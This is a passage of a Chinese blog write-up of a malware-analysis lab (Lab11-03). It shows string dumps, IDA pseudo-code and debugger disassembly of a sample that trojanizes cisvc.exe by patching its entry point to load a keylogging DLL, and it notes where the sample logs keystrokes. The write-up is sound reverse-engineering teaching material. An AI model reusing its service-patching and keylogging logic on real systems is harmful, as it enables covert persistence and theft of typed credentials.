+<p>在Lab11-03.exe中发现了一些有意思的字符串：</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs dns">Address	Length	Type	String<br>.rdata:<span class="hljs-number">004080E8</span>	<span class="hljs-number">00000008</span>	C	cmd.exe<br>.rdata:<span class="hljs-number">004080F0</span>	<span class="hljs-number">0000000</span>C	C	command.com<br>.rdata:<span class="hljs-number">00408100</span>	<span class="hljs-number">00000008</span>	C	COMSPEC<br>.rdata:<span class="hljs-number">00408118</span>	<span class="hljs-number">00000005</span>	C	PATH<br>.rdata:<span class="hljs-number">00408128</span>	<span class="hljs-number">00000005</span>	C	.exe<br>.rdata:<span class="hljs-number">00408130</span>	<span class="hljs-number">00000005</span>	C	.bat<br>.rdata:<span class="hljs-number">00408138</span>	<span class="hljs-number">00000005</span>	C	.cmd<br>.data:<span class="hljs-number">00409139</span>	<span class="hljs-number">00000024</span>	C	C:\\WINDOWS\\System32\\inet_epar32.dll<br>.data:<span class="hljs-number">0040915</span>D	<span class="hljs-number">0000000</span>C	C	zzz<span class="hljs-number">69806582</span><br>.data:<span class="hljs-number">00409174</span>	<span class="hljs-number">00000010</span>	C	net start cisvc<br>.data:<span class="hljs-number">00409184</span>	<span class="hljs-number">00000017</span>	C	C:\\WINDOWS\\System32\\%s<br>.data:<span class="hljs-number">0040919</span>C	<span class="hljs-number">0000000</span><span class="hljs-keyword">A</span>	C	cisvc.exe<br>.data:<span class="hljs-number">004091A8</span>	<span class="hljs-number">0000000</span>D	C	Lab11-<span class="hljs-number">03</span>.dll<br>.data:<span class="hljs-number">004091B8</span>	<span class="hljs-number">00000024</span>	C	C:\\WINDOWS\\System32\\inet_epar32.dll<br></code></pre></td></tr></table></figure>
+
+<p>Lab11-03.dll中的字符串：</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs dns">.rdata:<span class="hljs-number">1000754</span>C	<span class="hljs-number">00000008</span>	C	H:mm:ss<br>.rdata:<span class="hljs-number">10007554</span>	<span class="hljs-number">00000014</span>	C	dddd, MMMM dd, yyyy<br>.rdata:<span class="hljs-number">10007568</span>	<span class="hljs-number">00000007</span>	C	M/d/yy<br>.rdata:<span class="hljs-number">10007578</span>	<span class="hljs-number">00000009</span>	C	December<br>.rdata:<span class="hljs-number">10007584</span>	<span class="hljs-number">00000009</span>	C	November<br>.rdata:<span class="hljs-number">10007590</span>	<span class="hljs-number">00000008</span>	C	October<br>.rdata:<span class="hljs-number">10007598</span>	<span class="hljs-number">0000000</span><span class="hljs-keyword">A</span>	C	September<br>.rdata:<span class="hljs-number">100075A4</span>	<span class="hljs-number">00000007</span>	C	August<br>.rdata:<span class="hljs-number">100075</span>AC	<span class="hljs-number">00000005</span>	C	July<br>.rdata:<span class="hljs-number">100075B4</span>	<span class="hljs-number">00000005</span>	C	June<br>.rdata:<span class="hljs-number">100075</span>BC	<span class="hljs-number">00000006</span>	C	April<br>.rdata:<span class="hljs-number">100075C4</span>	<span class="hljs-number">00000006</span>	C	March<br>.rdata:<span class="hljs-number">100075</span>CC	<span class="hljs-number">00000009</span>	C	February<br>.rdata:<span class="hljs-number">100075D8</span>	<span class="hljs-number">00000008</span>	C	January<br>.rdata:<span class="hljs-number">10007610</span>	<span class="hljs-number">00000009</span>	C	Saturday<br>.rdata:<span class="hljs-number">1000761</span>C	<span class="hljs-number">00000007</span>	C	Friday<br>.rdata:<span class="hljs-number">10007624</span>	<span class="hljs-number">00000009</span>	C	Thursday<br>.rdata:<span class="hljs-number">10007630</span>	<span class="hljs-number">0000000</span><span class="hljs-keyword">A</span>	C	Wednesday<br>.rdata:<span class="hljs-number">1000763</span>C	<span class="hljs-number">00000008</span>	C	Tuesday<br>.rdata:<span class="hljs-number">10007644</span>	<span class="hljs-number">00000007</span>	C	Monday<br>.rdata:<span class="hljs-number">1000764</span>C	<span class="hljs-number">00000007</span>	C	Sunday<br>.rdata:<span class="hljs-number">10007670</span>	<span class="hljs-number">00000016</span>	C	SunMonTueWedThuFriSat<br>.rdata:<span class="hljs-number">10007688</span>	<span class="hljs-number">00000025</span>	C	JanFebMarAprMayJunJulAugSepOctNovDec<br>.rdata:<span class="hljs-number">1000785</span>C	<span class="hljs-number">0000000</span>D	C	KERNEL32.dll<br>.rdata:<span class="hljs-number">100078A6</span>	<span class="hljs-number">0000000</span>B	C	USER32.dll<br>.rdata:<span class="hljs-number">10007C82</span>	<span class="hljs-number">0000000</span>F	C	Lab1103dll.dll<br>.rdata:<span class="hljs-number">10007C91</span>	<span class="hljs-number">0000000</span>C	C	zzz<span class="hljs-number">69806582</span><br>.data:<span class="hljs-number">10008030</span>	<span class="hljs-number">00000006</span>	C	<span class="hljs-number">0</span>x%x <br>.data:<span class="hljs-number">10008038</span>	<span class="hljs-number">00000009</span>	C	&lt;SHIFT&gt; <br>.data:<span class="hljs-number">10008044</span>	<span class="hljs-number">00000008</span>	C	%s: %s\n<br>.data:<span class="hljs-number">1000804</span>C	<span class="hljs-number">00000022</span>	C	C:\\WINDOWS\\System32\\kernel64x.dll<br></code></pre></td></tr></table></figure>
+
+<p>程序导入了<code>GetAsyncKeyState</code>函数，因此可能是一个键盘窃听器。</p>
+<p><strong>2.当运行这个恶意代码时，发生了什么？</strong></p>
+<p>运行<code>ProcessMonitor</code>并运行这个恶意代码可以找出如下行为：</p>
+<ul>
+<li>程序将自身复制到<code>C:\\WINDOWS\\System32\\inet_epar32.dll</code></li>
+<li>对文件<code>C:\\WINDOWS\\System32\\kernel64x.dll</code>进行写操作</li>
+<li>对文件<code>C:\\WINDOWS\\System32\\cisvc.exe</code>进行写操作</li>
+</ul>
+<p><strong>3.Lab11-03.exe如何安装Lab11-03.dll使其长期驻留？</strong></p>
+<p>将Lab11-03.exe加载到IDA中可以看到：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  CHAR FileName; <span class="hljs-comment">// [esp+0h] [ebp-104h]</span><br><br>  CopyFileA(ExistingFileName, NewFileName, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">sprintf</span>(&amp;FileName, aCWindowsSystem_0, aCisvcExe);<br>  sub_401070(&amp;FileName);<br>  system(aNetStartCisvc);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>程序先将<code>Lab11-03.dll</code>拷贝到<code>C:\WINDOWS\System32\inet_epar32.dll</code>，然后又打开了<code>cisvc.exe</code>的句柄，将此句柄作为函数 <code>sub_401070</code>的参数门之后又使用<code>net start cisvc</code>命令启动了<code>cisvc</code>服务，结合之前的分析我们可以猜测恶意代码对<code>cisvc</code>进行了修改，因此把分析的重点放到函数<code>sub_401070</code>上。</p>
+<p>从IDA为 <code>sub_401070</code>生成的伪c代码来看：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_401070</span><span class="hljs-params">(LPCSTR lpFileName)</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  HANDLE hFile; <span class="hljs-comment">// [esp+Ch] [ebp-2Ch]</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+10h] [ebp-28h]</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [esp+14h] [ebp-24h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+18h] [ebp-20h]</span><br>  _DWORD *v6; <span class="hljs-comment">// [esp+24h] [ebp-14h]</span><br>  DWORD dwMaximumSizeLow; <span class="hljs-comment">// [esp+28h] [ebp-10h]</span><br>  HANDLE hFileMappingObject; <span class="hljs-comment">// [esp+2Ch] [ebp-Ch]</span><br>  _DWORD *lpBaseAddress; <span class="hljs-comment">// [esp+34h] [ebp-4h]</span><br><br>  hFile = CreateFileA(lpFileName, <span class="hljs-number">0xC0000000</span>, <span class="hljs-number">1u</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4u</span>, <span class="hljs-number">0x80</span>u, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> ( hFile == <span class="hljs-number">-1</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  dwMaximumSizeLow = GetFileSize(hFile, <span class="hljs-number">0</span>);<br>  hFileMappingObject = CreateFileMappingA(hFile, <span class="hljs-number">0</span>, <span class="hljs-number">4u</span>, <span class="hljs-number">0</span>, dwMaximumSizeLow, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> ( hFileMappingObject == <span class="hljs-number">-1</span> )<br>  &#123;<br>    CloseHandle(hFile);<br>    result = <span class="hljs-number">-1</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    lpBaseAddress = MapViewOfFile(hFileMappingObject, <span class="hljs-number">6u</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, dwMaximumSizeLow);<br>    <span class="hljs-keyword">if</span> ( lpBaseAddress )<br>    &#123;<br>      v4 = lpBaseAddress + lpBaseAddress[<span class="hljs-number">15</span>];<br>      v6 = sub_401000((v4 + *(v4 + <span class="hljs-number">20</span>) + <span class="hljs-number">24</span>), *(v4 + <span class="hljs-number">6</span>));<br>      <span class="hljs-keyword">if</span> ( v6 )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( *(v4 + <span class="hljs-number">40</span>) )<br>        &#123;<br>          <span class="hljs-keyword">if</span> ( v6[<span class="hljs-number">4</span>] &gt; <span class="hljs-number">0x13A</span>u )<br>          &#123;<br>            <span class="hljs-keyword">if</span> ( (v6[<span class="hljs-number">4</span>] - v6[<span class="hljs-number">2</span>]) &gt;= <span class="hljs-number">0x13A</span> )<br>            &#123;<br>              v3 = v6[<span class="hljs-number">2</span>] + v6[<span class="hljs-number">5</span>];<br>              <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x13A</span>; ++i )<br>              &#123;<br>                <span class="hljs-keyword">if</span> ( *(&amp;dword_409030 + i) == <span class="hljs-number">0x78</span><br>                  &amp;&amp; *(&amp;dword_409030 + i + <span class="hljs-number">1</span>) == <span class="hljs-number">0x56</span><br>                  &amp;&amp; *(&amp;dword_409030 + i + <span class="hljs-number">2</span>) == <span class="hljs-number">0x34</span><br>                  &amp;&amp; *(&amp;dword_409030 + i + <span class="hljs-number">3</span>) == <span class="hljs-number">0x12</span> )<br>                &#123;<br>                  *(&amp;dword_409030 + i) = v6[<span class="hljs-number">5</span>] + *(v4 + <span class="hljs-number">40</span>) - *(v4 + <span class="hljs-number">44</span>) - (v3 + i + <span class="hljs-number">4</span>);<br>                  <span class="hljs-keyword">break</span>;<br>                &#125;<br>              &#125;<br>              qmemcpy(lpBaseAddress + v3, &amp;dword_409030, <span class="hljs-number">0x13A</span>u);<br>              *(v4 + <span class="hljs-number">40</span>) = *(v4 + <span class="hljs-number">44</span>) + v3 - v6[<span class="hljs-number">5</span>];<br>              CloseHandle(hFile);<br>              CloseHandle(hFileMappingObject);<br>              UnmapViewOfFile(lpBaseAddress);<br>              result = <span class="hljs-number">0</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>              result = <span class="hljs-number">-1</span>;<br>            &#125;<br>          &#125;<br>          <span class="hljs-keyword">else</span><br>          &#123;<br>            result = <span class="hljs-number">-1</span>;<br>          &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          result = <span class="hljs-number">-1</span>;<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        CloseHandle(hFile);<br>        CloseHandle(hFileMappingObject);<br>        UnmapViewOfFile(lpBaseAddress);<br>        result = <span class="hljs-number">-1</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      CloseHandle(hFile);<br>      CloseHandle(hFileMappingObject);<br>      UnmapViewOfFile(<span class="hljs-number">0</span>);<br>      result = <span class="hljs-number">-1</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>函数将文件<code>cisvc.exe</code>映射到内存之后对此文件进行了一些列的修改行为，但是由于代码又很多混淆，不容易进行静态分析，因此需要进行动态分析，载入OD中函数sub_401070下断点并进行单步调试，发现Lab11-03.exe会先查找<code>cisvc.exe</code>的PE头再查找到.text，然后在此位置有一个较为复杂的循环写值的操作：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:004011FF                 cmp     [ebp+var_20], 13Ah<br>.text:00401206                 jnb     short loc_40127C<br>.text:00401208                 mov     edx, [ebp+var_20]<br>.text:0040120B                 xor     eax, eax<br>.text:0040120D                 mov     al, byte ptr dword_409030[edx] ; shellcode<br>.text:00401213                 cmp     eax, 78h<br>.text:00401216                 jnz     short loc_401277<br>.text:00401218                 mov     ecx, [ebp+var_20]<br>.text:0040121B                 xor     edx, edx<br>.text:0040121D                 mov     dl, byte ptr (dword_409030+1)[ecx]<br>.text:00401223                 cmp     edx, 56h<br>.text:00401226                 jnz     short loc_401277<br>.text:00401228                 mov     eax, [ebp+var_20]<br>.text:0040122B                 xor     ecx, ecx<br>.text:0040122D                 mov     cl, byte ptr (dword_409030+2)[eax]<br>.text:00401233                 cmp     ecx, 34h<br>.text:00401236                 jnz     short loc_401277<br>.text:00401238                 mov     edx, [ebp+var_20]<br>.text:0040123B                 xor     eax, eax<br>.text:0040123D                 mov     al, byte ptr (dword_409030+3)[edx]<br>.text:00401243                 cmp     eax, 12h<br>.text:00401246                 jnz     short loc_401277<br>.text:00401248                 mov     ecx, [ebp+var_24]<br>.text:0040124B                 mov     edx, [ecx+28h]<br>.text:0040124E                 mov     eax, [ebp+var_14]<br>.text:00401251                 add     edx, [eax+14h]<br>.text:00401254                 mov     ecx, [ebp+var_24]<br>.text:00401257                 sub     edx, [ecx+2Ch]<br>.text:0040125A                 mov     eax, [ebp+var_20]<br>.text:0040125D                 mov     ecx, [ebp+var_28]<br>.text:00401260                 lea     eax, [ecx+eax+4]<br>.text:00401264                 sub     edx, eax<br>.text:00401266                 mov     [ebp+var_30], edx<br>.text:00401269                 mov     ecx, [ebp+var_20]<br>.text:0040126C                 mov     edx, [ebp+var_30]<br>.text:0040126F                 mov     dword_409030[ecx], edx<br>.text:00401275                 jmp     short loc_40127C<br></code></pre></td></tr></table></figure>
+
+<p>修改前：</p>
+<p><img src="https://i.loli.net/2019/03/24/5c972de3c9b9f.png" srcset="/img/loading.gif" lazyload></p>
+<p>修改后：</p>
+<p><img src="https://i.loli.net/2019/03/24/5c972df904409.png" srcset="/img/loading.gif" lazyload></p>
+<p>使用HexCmp工具查看这两个二进制文件的区别（淡红色区域）：</p>
+<p><img src="https://i.loli.net/2019/03/24/5c972fa1d5de8.png" srcset="/img/loading.gif" lazyload></p>
+<p>经过一步一步对比发现这些新的shellcode是位于<code>004011FF</code>的代码进行的，恶意代码对此文件的入口点进行了修改，由原来的<code>129B</code>修改为了<code>1A28</code>:</p>
+<p><img src="https://i.loli.net/2019/03/24/5c97323378bd9.png" srcset="/img/loading.gif" lazyload></p>
+<p>在OD中打开修改后的文件<code>cisvc.exe</code>看到如下<code>shellcode</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asm">01001B0A   .  FF55 FC       call dword ptr ss:[ebp-0x4]              ;  kernel32.LoadLibraryExA<br>01001B0D   .  8945 F0       mov dword ptr ss:[ebp-0x10],eax          ;  inet_epa.10000000<br>01001B10   .  8D83 24000000 lea eax,dword ptr ds:[ebx+0x24]<br>01001B16   .  50            push eax                                 ;  inet_epa.10000000<br>01001B17   .  8B45 F0       mov eax,dword ptr ss:[ebp-0x10]          ;  inet_epa.10000000<br>01001B1A   .  50            push eax                                 ;  inet_epa.10000000<br>01001B1B   .  FF55 F4       call dword ptr ss:[ebp-0xC]              ;  kernel32.GetProcAddress<br>01001B1E   .  8945 F8       mov dword ptr ss:[ebp-0x8],eax           ;  inet_epa.10000000<br>01001B21   .  FF55 F8       call dword ptr ss:[ebp-0x8]<br>01001B24   .  89EC          mov esp,ebp<br>01001B26   .  5D            pop ebp<br>01001B27   .^ E9 6FF7FFFF   jmp cisvc.0100129B<br></code></pre></td></tr></table></figure>
+
+<p><code>cisvc.exe</code>现时使用<code>LoadLibrary</code>函数将<code>C:\WINDOWS\System32\inet_epar32.dll</code>加载到内存中然后获取导出函数<code>zzz69806582</code>的地址并执行此函数，之后在跳转到正常的程序入口点，从而使恶意代码达到长期驻留的目的。</p>
+<p><strong>4.这个恶意代码感染Windows系统的哪个文件？</strong></p>
+<p><code>cisvc.exe</code></p>
+<p><strong>5.Lab11-03.dll做了什么？</strong></p>
+<p>名为的导出函数<code>zzz69806582</code>创建了一个线程，我们集中分析这个函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">zzz69806582</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">return</span> CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)StartAddress, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>函数会创建一个<code>MZ</code>的互斥量:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">push    offset Name     ; &quot;MZ&quot;<br>push    0               ; bInheritHandle<br>push    1F0001h         ; dwDesiredAccess<br>call    ds:OpenMutexA<br></code></pre></td></tr></table></figure>
+
+<p>将<code>C:\\WINDOWS\\System32\\kernel64x.dll</code>加载到内存中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asm">push    0<br>push    80h             ; dwFlagsAndAttributes<br>push    4               ; dwCreationDisposition<br>push    0               ; lpSecurityAttributes<br>push    1               ; dwShareMode<br>push    0C0000000h      ; dwDesiredAccess<br>push    offset FileName ; &quot;C:\\WINDOWS\\System32\\kernel64x.dll&quot;<br>call    ds:CreateFileA<br></code></pre></td></tr></table></figure>
+
+<p>将文件指针指向<code>C:\\WINDOWS\\System32\\kernel64x.dll</code>的末尾：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">push    2<br>push    0               ; lpDistanceToMoveHigh<br>push    0               ; lDistanceToMove<br>mov     eax, [ebp+hFile]<br>push    eax             ; hFile<br>call    ds:SetFilePointer<br></code></pre></td></tr></table></figure>
+
+<p>循环调用函数<code>sub_10001380</code>进行键盘敲击记录：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">signed</span> <span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_10001380</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span><br>&#123;<br>  DWORD NumberOfBytesWritten; <span class="hljs-comment">// [esp+4h] [ebp-404h]</span><br>  <span class="hljs-type">char</span> Buffer; <span class="hljs-comment">// [esp+8h] [ebp-400h]</span><br><br>  <span class="hljs-keyword">while</span> ( !sub_10001030(a1) )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( *(_DWORD *)a1 )<br>    &#123;<br>      <span class="hljs-built_in">sprintf</span>(&amp;Buffer, aSS, a1 + <span class="hljs-number">4</span>, a1 + <span class="hljs-number">1032</span>);<br>      WriteFile(*(HANDLE *)(a1 + <span class="hljs-number">2060</span>), &amp;Buffer, <span class="hljs-built_in">strlen</span>(&amp;Buffer), &amp;NumberOfBytesWritten, <span class="hljs-number">0</span>);<br>    &#125;<br>    Sleep(<span class="hljs-number">0xA</span>u);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>6.这个恶意代码将收集的数据存放在何处？</strong></p>
+<p><code>C:\\WINDOWS\\System32\\kernel64x.dll</code></p>
+<h2 id="本章结束🎊"><a href="#本章结束🎊" class="headerlink" title="本章结束🎊"></a>本章结束🎊</h2>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/">恶意代码分析</a>
+                    
+                      <a class="hover-with-bg" href="/tags/ShellCode/">ShellCode</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%81%B6%E6%84%8F%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90/">恶意行为分析</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E7%89%B9%E6%B4%9B%E4%BC%8A%E6%9C%A8%E9%A9%AC%E5%8C%96%E6%8A%80%E6%9C%AF/">特洛伊木马化技术</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/03/%E9%9A%90%E8%94%BD%E7%9A%84%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%90%AF%E5%8A%A8/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">隐蔽的恶意代码启动</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/03/%E4%BD%BF%E7%94%A8WinDbg%E8%B0%83%E8%AF%95%E5%86%85%E6%A0%B8/">
+                        <span class="hidden-mobile">使用WinDbg调试内核</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
